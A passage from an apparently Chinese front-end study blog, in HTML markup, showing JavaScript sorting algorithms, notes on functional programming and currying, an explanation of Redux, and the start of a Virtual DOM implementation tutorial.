class="keyword">var</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">        left = arr.slice(<span class="number">0</span>, middle),</span><br><span class="line">        right = arr.slice(middle);</span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left.length><span class="number">0</span> && right.length><span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] <= right[<span class="number">0</span>]) {</span><br><span class="line">            result.push(left.shift());</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            result.push(right.shift());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left.length)</span><br><span class="line">        result.push(left.shift());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (right.length)</span><br><span class="line">        result.push(right.shift());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">arr, left, right</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> len = arr.length,</span><br><span class="line">        partitionIndex,</span><br><span class="line">        left = <span class="keyword">typeof</span> left != <span class="string">'number'</span> ? <span class="number">0</span> : left,</span><br><span class="line">        right = <span class="keyword">typeof</span> right != <span class="string">'number'</span> ? len - <span class="number">1</span> : right;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left < right) {</span><br><span class="line">        partitionIndex = partition(arr, left, right);</span><br><span class="line">        quickSort(arr, left, partitionIndex<span class="number">-1</span>);</span><br><span class="line">        quickSort(arr, partitionIndex+<span class="number">1</span>, right);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">arr, left ,right</span>) </span>{     <span class="comment">//分区操作</span></span><br><span class="line">    <span class="keyword">var</span> pivot = left,                      <span class="comment">//设定基准值（pivot）</span></span><br><span class="line">        index = pivot + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = index; i <= right; i++) {</span><br><span class="line">        <span class="keyword">if</span> (arr[i] < arr[pivot]) {</span><br><span class="line">            swap(arr, i, index);</span><br><span class="line">            index++;</span><br><span class="line">        }        </span><br><span class="line">    }</span><br><span class="line">    swap(arr, pivot, index - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> index<span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><img src="http://oe51jhwvd.bkt.clouddn.com/7.gif" alt="image"></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> len;    <span class="comment">//因为声明的多个函数都需要数据长度，所以把len设置成为全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildMaxHeap</span>(<span class="params">arr</span>) </span>{   <span class="comment">//建立大顶堆</span></span><br><span class="line">    len = arr.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="built_in">Math</span>.floor(len/<span class="number">2</span>); i &gt;= <span class="number">0</span>; i--) {</span><br><span class="line">        heapify(arr, i);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapify</span>(<span class="params">arr, i</span>) </span>{     <span class="comment">//堆调整</span></span><br><span class="line">    <span class="keyword">var</span> left = <span class="number">2</span> * i + <span class="number">1</span>,</span><br><span class="line">        right = <span class="number">2</span> * i + <span class="number">2</span>,</span><br><span class="line">        largest = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left < len && arr[left] > arr[largest]) {</span><br><span class="line">        largest = left;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (right < len && arr[right] > arr[largest]) {</span><br><span class="line">        largest = right;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (largest != i) {</span><br><span class="line">        swap(arr, i, largest);</span><br><span class="line">        heapify(arr, largest);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapSort</span>(<span class="params">arr</span>) </span>{</span><br><span class="line">    buildMaxHeap(arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = arr.length<span class="number">-1</span>; i > <span class="number">0</span>; i--) {</span><br><span class="line">        swap(arr, <span class="number">0</span>, i);</span><br><span class="line">        len--;</span><br><span class="line">        heapify(arr, <span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="5-函数式编程"><a href="#5-函数式编程" class="headerlink" title="==5. 函数式编程=="></a>==5. 函数式编程==</h2><p>函数式编程有一下几个特点：</p><ul><li>函数是“第一等公民”：函数与其他数据类型一样，可以赋值给其他变量，也可以作为参数，传入另一个函数，或作为别的函数的返回值</li><li>只用“表达书”，不用语句：每一步都是单纯的运算，而且都有返回值</li><li>没有“副作用”：函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其不得修改外部变量的值</li><li>不修改状态，返回新的值，不修改系统变量</li><li>引用透明：函数的运行不依赖与外部变量或“状态”，只依赖于输入的参数，任何时候只要参数相同，引用函数所得到的返回值总是相同的</li></ul><p>优点：</p><ul><li>代码简洁，开发快速：函数式编程大量使用函数，减少了代码的重复，因此程序比较短，开发速度较快</li><li>接近自然语言，易于理解</li><li>更方便的代码管理：函数式编程不依赖、也不会改变外界的状态，只要给定输入参数，返回的结果必定相同。因此，每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging），以及模块化组合。</li><li>易于”并发编程”：函数式编程不需要考虑”死锁”（deadlock），因为它不修改变量，所以根本不存在”锁”线程的问题。不必担心一个线程的数据，被另一个线程修改，所以可以很放心地把工作分摊到多个线程，部署”并发编程”（concurrency）</li><li>代码的热升级：函数式编程没有副作用，只要保证接口不变，内部实现是外部无关的。所以，可以在运行状态下直接升级代码，不需要重启，也不需要停机。</li></ul><h2 id="6-函数式编程——柯里化（curry）"><a href="#6-函数式编程——柯里化（curry）" class="headerlink" title="==6. 函数式编程——柯里化（curry）=="></a>==6. 函数式编程——柯里化（curry）==</h2><p>curry 的概念很简单：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>{</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>{</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  };</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> increment = add(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> addTen = add(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">increment(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">addTen(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 12</span></span><br></pre></td></tr></tbody></table></figure><p>我们来创建一些 curry 函数享受下（译者注：此处原文是“for our enjoyment”，语出自圣经）</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> curry = <span class="built_in">require</span>(<span class="string">'lodash'</span>).curry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> match = curry(<span class="function"><span class="keyword">function</span>(<span class="params">what, str</span>) </span>{</span><br><span class="line">  <span class="keyword">return</span> str.match(what);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> replace = curry(<span class="function"><span class="keyword">function</span>(<span class="params">what, replacement, str</span>) </span>{</span><br><span class="line">  <span class="keyword">return</span> str.replace(what, replacement);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> filter = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, ary</span>) </span>{</span><br><span class="line">  <span class="keyword">return</span> ary.filter(f);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, ary</span>) </span>{</span><br><span class="line">  <span class="keyword">return</span> ary.map(f);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>我在上面的代码中遵循的是一种简单，同时也非常重要的模式。即策略性地把要操作的数据（String， Array）放到最后一个参数里。到使用它们的时候你就明白这样做的原因是什么了。</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">match(<span class="regexp">/\s+/g</span>, <span class="string">"hello world"</span>);</span><br><span class="line"><span class="comment">// [ ' ' ]</span></span><br><span class="line"></span><br><span class="line">match(<span class="regexp">/\s+/g</span>)(<span class="string">"hello world"</span>);</span><br><span class="line"><span class="comment">// [ ' ' ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hasSpaces = match(<span class="regexp">/\s+/g</span>);</span><br><span class="line"><span class="comment">// function(x) { return x.match(/\s+/g) }</span></span><br><span class="line"></span><br><span class="line">hasSpaces(<span class="string">"hello world"</span>);</span><br><span class="line"><span class="comment">// [ ' ' ]</span></span><br><span class="line"></span><br><span class="line">hasSpaces(<span class="string">"spaceless"</span>);</span><br><span class="line"><span class="comment">// null</span></span><br><span class="line"></span><br><span class="line">filter(hasSpaces, [<span class="string">"tori_spelling"</span>, <span class="string">"tori amos"</span>]);</span><br><span class="line"><span class="comment">// ["tori amos"]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> findSpaces = filter(hasSpaces);</span><br><span class="line"><span class="comment">// function(xs) { return xs.filter(function(x) { return x.match(/\s+/g) }) }</span></span><br><span class="line"></span><br><span class="line">findSpaces([<span class="string">"tori_spelling"</span>, <span class="string">"tori amos"</span>]);</span><br><span class="line"><span class="comment">// ["tori amos"]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> noVowels = replace(<span class="regexp">/[aeiou]/ig</span>);</span><br><span class="line"><span class="comment">// function(replacement, x) { return x.replace(/[aeiou]/ig, replacement) }</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> censored = noVowels(<span class="string">"*"</span>);</span><br><span class="line"><span class="comment">// function(x) { return x.replace(/[aeiou]/ig, "*") }</span></span><br><span class="line"></span><br><span class="line">censored(<span class="string">"Chocolate Rain"</span>);</span><br><span class="line"><span class="comment">// 'Ch*c*l*t* R**n'</span></span><br></pre></td></tr></tbody></table></figure><p>这里表明的是一种“预加载”函数的能力，通过传递一到两个参数调用函数，就能得到一个记住了这些参数的新函数。</p><h2 id="7-redux理解"><a href="#7-redux理解" class="headerlink" title="==7. redux理解=="></a>==7. redux理解==</h2><ol><li><p>React有props和state: props意味着父级分发下来的属性，state意味着组件内部可以自行管理的状态，并且整个React没有数据向上回溯的能力，也就是说数据只能单向向下分发，或者自行内部消化。理解这个是理解React和Redux的前提。</p></li><li><p>一般构建的React组件内部可能是一个完整的应用，它自己工作良好，你可以通过属性作为API控制它。但是更多的时候发现React根本无法让两个组件互相交流，使用对方的数据。然后这时候不通过DOM沟通（也就是React体制内）解决的唯一办法就是提升state，将state放到共有的父组件中来管理，再作为props分发回子组件。</p></li><li><p>子组件改变父组件state的办法只能是通过onClick触发父组件声明好的回调，也就是父组件提前声明好函数或方法作为契约描述自己的state将如何变化，再将它同样作为属性交给子组件使用。这样就出现了一个模式：数据总是单向从顶层向下分发的，但是只有子组件回调在概念上可以回到state顶层影响数据。这样state一定程度上是响应式的。</p></li><li><p>为了面临所有可能的扩展问题，最容易想到的办法就是把所有state集中放到所有组件顶层，然后分发给所有组件。</p></li><li><p>为了有更好的state管理，就需要一个库来作为更专业的顶层state分发给所有React应用，这就是Redux。让我们回来看看重现上面结构的需求：</p><ol><li>需要回调通知state (等同于回调参数) -> action</li><li>需要根据回调处理 (等同于父级方法) -> reducer</li><li><p>需要state (等同于总状态) -> store</p><p>对Redux来说只有这三个要素：</p></li><li>action是纯声明式的数据结构，只提供事件的所有要素，不提供逻辑</li><li>reducer是一个匹配函数，action的发送是全局的：所有的reducer都可以捕捉到并匹配与自己相关与否，相关就拿走action中的要素进行逻辑处理，修改store中的状态，不相关就不对state做处理原样返回。</li><li><p>store负责存储状态并可以被react api回调，发布action.当然一般不会直接把两个库拿来用，还有一个binding叫react-redux, 提供一个Provider和connect。</p><p>很多人其实看懂了redux卡在这里。</p></li><li>Provider是一个普通组件，可以作为顶层app的分发点，它只需要store属性就可以了。它会将state分发给所有被connect的组件，不管它在哪里，被嵌套多少层。</li><li>connect是真正的重点，它是一个科里化函数，意思是先接受两个参数（数据绑定mapStateToProps和事件绑定mapDispatchToProps），再接受一个参数（将要绑定的组件本身）：mapStateToProps：构建好Redux系统的时候，它会被自动初始化，但是你的React组件并不知道它的存在，因此你需要分拣出你需要的Redux状态，所以你需要绑定一个函数，它的参数是state，简单返回你关心的几个值。</li></ol></li></ol><p>mapDispatchToProps：声明好的action作为回调，也可以被注入到组件里，就是通过这个函数，它的参数是dispatch，通过redux的辅助方法bindActionCreator绑定所有action以及参数的dispatch，就可以作为属性在组件里面作为函数简单使用了，不需要手动dispatch。这个mapDispatchToProps是可选的，如果不传这个参数redux会简单把dispatch作为属性注入给组件，可以手动当做store.dispatch使用。这也是为什么要科里化的原因。</p><p>做好以上流程Redux和React就可以工作了。简单地说就是：</p><ol><li>顶层分发状态，让React组件被动地渲染。</li><li>监听事件，事件有权利回到所有状态顶层影响状态。</li></ol><h2 id="8-虚拟dom"><a href="#8-虚拟dom" class="headerlink" title="==8. 虚拟dom=="></a>==8. 虚拟dom==</h2><p>相关链接：<a href="https://github.com/livoras/blog/issues/13" target="_blank" rel="noopener">深度剖析：如何实现一个 Virtual DOM 算法</a></p><p>源码网址： <a href="https://github.com/livoras/simple-virtual-dom" target="_blank" rel="noopener">GitHub</a></p><p>目录：</p><ul><li>对前端应用状态管理思考</li><li>Virtual DOM 算法</li><li>算法实现<ul><li>步骤一：用JS对象模拟DOM树</li><li>步骤二：比较两棵虚拟DOM树的差异</li><li>步骤三：把差异应用到真正的DOM树上</li></ul></li><li>结语</li><li>References</li></ul><h3 id="1-对前端应用状态管理的思考"><a href="#1-对前端应用状态管理的思考" class="headerlink" title="1 对前端应用状态管理的思考"></a>1 对前端应用状态管理的思考</h3><p>假如现在你需要写一个像下面一样的表格的应用程序，这个表格可以根据不同的字段进行升序或者降序的展示。</p><p><img src="https://pic3.zhimg.com/50/0c1ee6d9a303d5a43b0fa4b3fc82f3a2_hd.png" alt="image"></p><p>这个应用程序看起来很简单，你可以想出好几种不同的方式来写。最容易想到的可能是，在你的 JavaScript 代码里面存储这样的数据：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sortKey = <span class="string">"new"</span> <span class="comment">// 排序的字段，新增（new）、取消（cancel）、净关注（gain）、累积（cumulate）人数</span></span><br><span class="line"><span class="keyword">var</span> sortType = <span class="number">1</span> <span class="comment">// 升序还是逆序</span></span><br><span class="line"><span class="keyword">var</span> data = [{...}, {...}, {..}, ..] <span class="comment">// 表格数据</span></span><br></pre></td></tr></tbody></table></figure><p>用三个字段分别存储当前排序的字段、排序方向、还有表格数据；然后给表格头部加点击事件：当用户点击特定的字段的时候，根据上面几个字段存储的内容来对内容进行排序，然后用 JS 或者 jQuery 操作 DOM，更新页面的排序状态（表头的那几个箭头表示当前排序状态，也需要更新）和表格内容。</p><p>这样做会导致的后果就是，随着应用程序越来越复杂，需要在JS里面维护的字段也越来越多，需要监听事件和在事件回调用更新页面的DOM操作也越来越多，应用程序会变得非常难维护。后来人们使用了 MVC、MVP 的架构模式，希望能从代码组织方式来降低维护这种复杂应用程序的难度。但是 MVC 架构没办法减少你所维护的状态，也没有降低状态更新你需要对页面的更新操作（前端来说就是DOM操作），你需要操作的DOM还是需要操作，只是换了个地方。</p><p>既然状态改变了要操作相应的DOM元素，为什么不做一个东西可以让视图和状态进行绑定，状态变更了视图自动变更，就不用手动更新页面了。这就是后来人们想出了 MVVM 模式，只要在模版中声明视图组件是和什么状态进行绑定的，双向绑定引擎就会在状态更新的时候自动更新视图（关于MV*模式的内容，可以看这篇介绍）。</p><p>MVVM 可以很好的降低我们维护状态 -> 视图的复杂程度（大大减少代码中的视图更新逻辑）。但是这不是唯一的办法，还有一个非常直观的方法，可以大大降低视图更新的操作：一旦状态发生了变化，就用模版引擎重新渲染整个视图，然后用新的视图更换掉旧的视图。就像上面的表格，当用户点击的时候，还是在JS里面更新状态，但是页面更新就不用手动操作 DOM 了，直接把整个表格用模版引擎重新渲染一遍，然后设置一下innerHTML就完事了。</p><p>听到这样的做法，经验丰富的你一定第一时间意识这样的做法会导致很多的问题。最大的问题就是这样做会很慢，因为即使一个小小的状态变更都要重新构造整棵 DOM，性价比太低；而且这样做的话，input和textarea的会失去原有的焦点。最后的结论会是：对于局部的小视图的更新，没有问题（Backbone就是这么干的）；但是对于大型视图，如全局应用状态变更的时候，需要更新页面较多局部视图的时候，这样的做法不可取。</p><p>但是这里要明白和记住这种做法，因为后面你会发现，其实 Virtual DOM 就是这么做的，只是加了一些特别的步骤来避免了整棵 DOM 树变更。</p><p>另外一点需要注意的就是，上面提供的几种方法，其实都在解决同一个问题：维护状态，更新视图。在一般的应用当中，如果能够很好方案来应对这个问题，那么就几乎降低了大部分复杂性。</p><h3 id="2-Virtual-DOM算法"><a href="#2-Virtual-DOM算法" class="headerlink" title="2. Virtual DOM算法"></a>2. Virtual DOM算法</h3><p>DOM是很慢的。如果我们把一个简单的div元素的属性都打印出来，你会看到：</p><p><img src="https://pic4.zhimg.com/50/d5cda33e28d83ba12368202645f9e35b_hd.png" alt="image"></p><p>而这仅仅是第一层。真正的 DOM 元素非常庞大，这是因为标准就是这么设计的。而且操作它们的时候你要小心翼翼，轻微的触碰可能就会导致页面重排，这可是杀死性能的罪魁祸首。</p><p>相对于 DOM 对象，原生的 JavaScript 对象处理起来更快，而且更简单。DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> element = {</span><br><span class="line">  tagName: <span class="string">'ul'</span>, <span class="comment">// 节点标签名</span></span><br><span class="line">  props: { <span class="comment">// DOM的属性，用一个对象存储键值对</span></span><br><span class="line">    id: <span class="string">'list'</span></span><br><span class="line">  },</span><br><span class="line">  children: [ <span class="comment">// 该节点的子节点</span></span><br><span class="line">    {<span class="attr">tagName</span>: <span class="string">'li'</span>, <span class="attr">props</span>: {<span class="attr">class</span>: <span class="string">'item'</span>}, <span class="attr">children</span>: [<span class="string">"Item 1"</span>]},</span><br><span class="line">    {<span class="attr">tagName</span>: <span class="string">'li'</span>, <span class="attr">props</span>: {<span class="attr">class</span>: <span class="string">'item'</span>}, <span class="attr">children</span>: [<span class="string">"Item 2"</span>]},</span><br><span class="line">    {<span class="attr">tagName</span>: <span class="string">'li'</span>, <span class="attr">props</span>: {<span class="attr">class</span>: <span class="string">'item'</span>}, <span class="attr">children</span>: [<span class="string">"Item 3"</span>]},</span><br><span class="line">  ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上面对应的HTML写法是：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">ul</span> <span class="attr">id</span>=<span class="string">'list'</span>></span></span><br><span class="line">  <span class="tag"><<span class="name">li</span> <span class="attr">class</span>=<span class="string">'item'</span>></span>Item 1<span class="tag"></<span class="name">li</span>></span></span><br><span class="line">  <span class="tag"><<span class="name">li</span> <span class="attr">class</span>=<span class="string">'item'</span>></span>Item 2<span class="tag"></<span class="name">li</span>></span></span><br><span class="line">  <span class="tag"><<span class="name">li</span> <span class="attr">class</span>=<span class="string">'item'</span>></span>Item 3<span class="tag"></<span class="name">li</span>></span></span><br><span class="line"><span class="tag"></<span class="name">ul</span>></span></span><br></pre></td></tr></tbody></table></figure><p>既然原来 DOM 树的信息都可以用 JavaScript 对象来表示，反过来，你就可以根据这个用 JavaScript 对象表示的树结构来构建一棵真正的DOM树。</p><p>之前的章节所说的，状态变更->重新渲染整个视图的方式可以稍微修改一下：用 JavaScript 对象表示 DOM 信息和结构，当状态变更的时候，重新渲染这个 JavaScript 的对象结构。当然这样做其实没什么卵用，因为真正的页面其实没有改变。</p><p>但是可以用新渲染的对象树去和旧的树进行对比，记录这两棵树差异。记录下来的不同就是我们需要对页面真正的 DOM 操作，然后把它们应用在真正的 DOM 树上，页面就变更了。这样就可以做到：视图的结构确实是整个全新渲染了，但是最后操作DOM的时候确实只变更有不同的地方。</p><p>这就是所谓的 Virtual DOM 算法。包括几个步骤：</p><ol><li>==用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档书中==</li><li>==当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异==</li><li>==把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了==</li></ol><p>Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。</p><h3 id="3-算法实现"><a href="#3-算法实现" class="headerlink" title="3. 算法实现"></a>3. 算法实现</h3><h4 id="3-1-步骤一：用JS对象模拟DOM树"><a href="#3-1-步骤一：用JS对象模拟DOM树" class="headerlink" title="3.1 步骤一：用JS对象模拟DOM树"></a>3.1 步骤一：用JS对象模拟DOM树</h4><p>用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点：</p><p>element.js</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Element</span> (<span class="params">tagName, props, children</span>) </span>{</span><br><span class="line">  <span class="keyword">this</span>.tagName = tagName</span><br><span class="line">  <span class="keyword">this</span>.props = props</span><br><span class="line">  <span class="keyword">this</span>.children = children</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">tagName, props, children</span>) </span>{</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Element(tagName, props, children)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>例如上面的 DOM 结构就可以简单的表示：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">require</span>(<span class="string">'./element'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ul = el(<span class="string">'ul'</span>, {<span class="attr">id</span>: <span class="string">'list'</span>}, [</span><br><span class="line">  el(<span class="string">'li'</span>, {<span class="attr">class</span>: <span class="string">'item'</span>}, [<span class="string">'Item 1'</span>]),</span><br><span class="line">  el(<span class="string">'li'</span>, {<span class="attr">class</span>: <span class="string">'item'</span>}, [<span class="string">'Item 2'</span>]),</span><br><span class="line">  el(<span class="string">'li'</span>, {<span class="attr">class</span>: <span class="string">'item'</span>}, [<span class="string">'Item 3'</span>])</span><br><span class="line">])</span><br></pre></td></tr></tbody></table></figure><p>现在ul只是一个 JavaScript 对象表示的 DOM 结构，页面上并没有这个结构。我们可以根据这个ul构建真正的:</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Element.prototype.render = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">  <span class="keyword">var</span> el = <span 